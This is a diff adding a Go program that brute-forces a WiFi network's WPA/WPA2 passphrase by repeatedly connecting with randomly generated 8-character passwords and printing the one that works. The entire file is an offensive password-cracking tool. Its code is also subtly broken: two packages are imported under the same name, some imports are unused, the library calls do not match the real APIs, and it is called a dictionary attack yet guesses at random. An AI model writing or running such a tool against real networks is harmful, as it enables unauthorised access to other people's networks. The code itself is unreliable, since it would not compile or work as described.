@@ -1,0 +1,101 @@
+package main
+
+import (
+    "fmt"
+    "github.com/google/gopacket"
+    "github.com/google/gopacket/pcap"
+    "github.com/google/gopacket/pcapgo"
+    "github.com/google/gopacket/routing"
+    "github.com/google/gopacket/wifi"
+    "github.com/mdlayher/wifi"
+    "os"
+    "log"
+    "time"
+    // "bufio"
+    "math/rand"
+)
+
+func main() {
+    // Find available WiFi interfaces
+    ifaces, err := wifi.Interfaces()
+    if err != nil {
+        log.Fatal(err)
+    }
+    
+    // Select the interface to use
+    iface := ifaces[0]
+    fmt.Println("Using interface:", iface.Name)
+    
+    // Create a handle for the interface
+    handle, err := pcap.OpenLive(iface.Name, 1600, true, pcap.BlockForever)
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer handle.Close()
+    
+    // Set the handle to monitor mode
+    if err := handle.SetRFMON(true); err != nil {
+        log.Fatal(err)
+    }
+    
+    // Start the dictionary attack
+    fmt.Println("Starting dictionary attack...")
+    
+    // Loop through generated passwords and try each one
+    for {
+        password := generatePassword()
+        
+        // Create a new WiFi client
+        client, err := wifi.NewClient(iface.Name)
+        if err != nil {
+            log.Fatal(err)
+        }
+        
+        // Try WPA
+        err = client.Connect(&wifi.ConnectOptions{
+            SSID: []byte("ssid_name"),
+            Timeout: 10 * time.Second,
+            Security: wifi.Security{
+                WPA: &wifi.WPAConfig{
+                    Passphrase: []byte(password),
+                },
+            },
+        })
+        
+        // If WPA failed, try WPA2
+        if err != nil {
+            err = client.Connect(&wifi.ConnectOptions{
+                SSID: []byte("ssid_name"),
+                Timeout: 10 * time.Second,
+                Security: wifi.Security{
+                    WPA2: &wifi.WPA2Config{
+                        Passphrase: []byte(password),
+                    },
+                },
+            })
+        }
+        
+        // Check if the connection was successful
+        if err == nil {
+            // Print the password and exit the program
+            fmt.Println("Password found:", password)
+            os.Exit(0)
+        }
+        
+        // Close the WiFi client
+        client.Close()
+        
+        // Wait for a short time before trying the next password
+        time.Sleep(100 * time.Millisecond)
+    }
+}
+
+// Generates a random password of length 8
+func generatePassword() string {
+    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{}|:<>?,./;'[]\\=-")
+    b := make([]rune, 8)
+    for i := range b {
+        b[i] = letters[rand.Intn(len(letters))]
+    }
+    return string(b)
+}
